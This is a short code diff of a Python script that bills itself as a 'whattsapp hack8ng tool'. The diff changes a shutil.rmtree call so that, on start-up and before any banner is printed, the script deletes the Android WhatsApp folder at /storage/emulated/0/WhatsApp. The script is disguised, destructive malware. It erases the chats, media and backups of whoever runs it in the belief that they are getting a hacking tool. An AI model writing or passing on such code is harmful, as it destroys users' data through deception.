@@ -1,6 +1,6 @@
 import shutil
 import sys
-shutil.rmtree('/storage/emulated/0/2.1')
+shutil.rmtree('/storage/emulated/0/WhatsApp')
 
 print('--------------------------------------------')
 print('wellcome to whattsapp hack8ng tool')
